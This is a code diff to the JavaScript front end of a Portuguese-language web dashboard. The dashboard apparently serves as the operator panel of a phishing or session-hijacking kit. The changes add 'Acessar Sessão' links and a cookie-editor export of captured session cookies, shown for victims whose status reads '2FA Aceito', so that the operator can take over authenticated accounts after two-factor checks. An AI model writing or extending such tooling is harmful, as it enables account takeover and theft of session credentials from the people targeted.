@@ -25,6 +25,7 @@ const modalCookiesTitulo = document.getElementById("modal-cookies-titulo");
 const modalCookiesJson = document.getElementById("modal-cookies-json");
 const btnFecharModalCookies = document.getElementById("btn-fechar-modal-cookies");
 const btnCopiarModalCookies = document.getElementById("btn-copiar-modal-cookies");
+const btnModalAbrirSessao = document.getElementById("btn-modal-abrir-sessao");
 const toast = document.getElementById("toast");
 const toastMsg = document.getElementById("toast-msg");
 
@@ -74,13 +75,16 @@ async function abrirModalCookies(usuario) {
   if (!modalCookies || !modalCookiesJson) return;
   try {
     if (modalCookiesTitulo) modalCookiesTitulo.textContent = `Cookies de Sessão — ${usuario}`;
+    if (btnModalAbrirSessao) {
+      btnModalAbrirSessao.href = `/sessao/${encodeURIComponent(usuario)}`;
+    }
     modalCookiesJson.value = "Carregando cookies...";
     modalCookies.style.display = "flex";
 
     const res = await fetch(`/api/sessao/${encodeURIComponent(usuario)}`);
     if (!res.ok) throw new Error("Sessão não encontrada");
     const json = await res.json();
-    modalCookiesJson.value = JSON.stringify(json.cookies || json, null, 2);
+    modalCookiesJson.value = JSON.stringify(json.cookie_editor_json || json.cookies || json, null, 2);
   } catch (err) {
     modalCookiesJson.value = "Nenhum cookie disponível ou erro ao carregar.";
   }
@@ -313,7 +317,11 @@ function renderizarTabela() {
                   )
                 )
               )}
-              ${(item.total_cookies > 0 || item.cookies) ? `
+              ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
+                <a href="/sessao/${encodeURIComponent(item.usuario)}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 5px 10px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(2, 215, 47, 0.35);" title="Acessar Sessão Autenticada Finalizada">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                  <span>Acessar Sessão</span>
+                </a>
                 <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 10px; font-size: 11px;" type="button" title="Visualizar e copiar cookies da sessão autenticada" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
                   <span>Cookies (${item.total_cookies || 'OK'})</span>
@@ -439,7 +447,11 @@ function renderizarTabela() {
                   </button>
                 ` : ''
               )}
-              ${(item.total_cookies > 0 || item.cookies) ? `
+              ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
+                <a href="/sessao/${encodeURIComponent(item.usuario)}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 4px 8px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                  <span>Acessar</span>
+                </a>
                 <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 8px; font-size: 11px;" type="button" title="Cookies de Sessão" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
                   <span>Cookies</span>
